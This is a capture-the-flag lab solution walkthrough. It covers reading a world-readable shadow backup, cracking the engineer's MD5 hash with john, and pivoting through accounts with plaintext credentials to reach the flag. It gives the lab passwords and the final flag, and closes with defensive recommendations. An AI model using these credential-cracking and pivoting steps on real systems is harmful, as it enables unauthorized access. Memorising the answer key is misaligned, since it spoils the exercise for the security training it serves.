# Blackrock Dynamics: Hash Relay

## Overview

Students exploit a credential relay chain on a Blackrock Dynamics server. A world-readable shadow backup exposes a weak MD5 hash for the engineer account. After cracking it, the student finds DevOps credentials stored in the engineer's home directory and pivots to the devops account to capture the flag.

## Architecture

```
┌─────────────┐                     ┌──────────────┐
│   Student    │ ──── SSH:22 ─────▶ │    target     │
│   (Kali VM)  │                    │ (blackrock)   │
└─────────────┘                     └──────────────┘
                                     User: operator
                                     Goal: devops
```

## Credential Relay Chain

```
operator (initial access)
    │
    ├── /opt/blackrock/backups/shadow.bak (world-readable)
    │       └── engineer hash (MD5, weak password)
    │
    ▼
engineer (cracked password: "security")
    │
    ├── /home/engineer/secrets.txt
    │       └── devops credentials
    │
    ▼
devops (password from secrets.txt)
    │
    └── /home/devops/flag.txt → token 2
```

## Solution Walkthrough

### Step 1: Connect as Operator

```bash
ssh operator@<target_ip>
# Password: Bl4ckr0ck_0ps#
```

### Step 2: Discover the Shadow Backup

```bash
ls -la /opt/blackrock/backups/
cat /opt/blackrock/backups/shadow.bak
```

The shadow.bak file is world-readable (644); this is the vulnerability. Note the assessment marker file as well:

```bash
cat /opt/blackrock/backups/assessment_marker.txt
# h4sh_r3l4y
```

### Step 3: Crack the Engineer Hash

Extract and crack the engineer hash using john:

```bash
grep engineer /opt/blackrock/backups/shadow.bak > /tmp/engineer_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/engineer_hash.txt
john --show /tmp/engineer_hash.txt
```

The password "security" cracks almost instantly.

### Step 4: Pivot to Engineer

```bash
su engineer
# Password: security
cat ~/secrets.txt
```

The secrets.txt file contains the devops account credentials.

### Step 5: Pivot to DevOps and Capture the Flag

```bash
su devops
# Password: Bl4ckr0ck_D3v#
cat ~/flag.txt
# ch41n
```

### Step 6: Assemble the Flag

Combine the two tokens: `OCR{h4sh_r3l4y_ch41n}`

## Common Mistakes

- **Missing the backup directory.** Students may not enumerate /opt thoroughly. The operator notes hint at the backup location.
- **Not knowing how to use john.** Students need to extract just the relevant line from shadow.bak and may need the corresponding passwd.bak line for unshadowing.
- **Overlooking secrets.txt.** After cracking engineer's password, students may try to escalate privileges directly rather than looking at files in the home directory.
- **Permission confusion.** The flag.txt is chmod 600 owned by devops; it cannot be read as engineer.

## Defensive Recommendations

- Never store shadow file backups in world-readable locations
- Enforce strong password policies to prevent dictionary attacks
- Do not store credentials in plaintext files
- Audit backup scripts and clean up legacy copies of sensitive files
- Implement proper secrets management (HashiCorp Vault, etc.)
